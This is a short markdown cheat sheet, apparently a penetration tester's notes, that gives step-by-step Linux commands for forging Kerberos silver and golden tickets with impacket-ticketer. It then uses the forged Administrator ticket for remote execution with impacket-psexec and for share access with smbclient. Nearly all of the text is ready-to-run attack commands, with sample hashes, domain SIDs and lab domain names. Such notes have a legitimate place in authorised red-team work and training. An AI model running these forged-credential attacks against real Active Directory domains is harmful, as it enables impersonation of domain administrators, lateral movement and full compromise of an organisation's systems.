# forge ticket on linux
```bash
# silver ticket
$ impacket-ticketer -spn <SPN> -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <ADuser>

$ impacket-ticketer -spn cifs/server.test.local -nthash 0123456789ABCDEF0123456789ABCDEF -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain TEST.LOCAL  Administrator
```
```bash
# golden-ticket
$ impacket-ticketer -nthash <krbtgt_ntlmhash> -domain-sid <domain_sid> -domain <domain> <ADuser>

# no service SPN must be specified
# the krbtgt ntlm hash must be used

$ impacket-ticketer -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park Administrator
```
- The script will create a `.ccache` file (e.g., `Administrator.ccache`) in the current directory.
- This file contains a forged TGS for the `cifs/server.test.local` service.
## Use forged TGS ticket
```bash
export KRB5CCNAME=/path/to/Administrator.ccache

impacket-psexec jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
smbclient //server.test.local/sharename -k -U TEST.LOCAL\\Administrator
# -k (Kerberos) means the tool will attempt to use the existing ticket in KRB5CCNAME.
```
If the SPN is, for example, `http/webserver.test.local`, you can similarly attempt to authenticate to web services that support Kerberos SSO (e.g., `curl --negotiate`, `wget --auth-negotiate`), after first setting the appropriate `KRB5CCNAME`.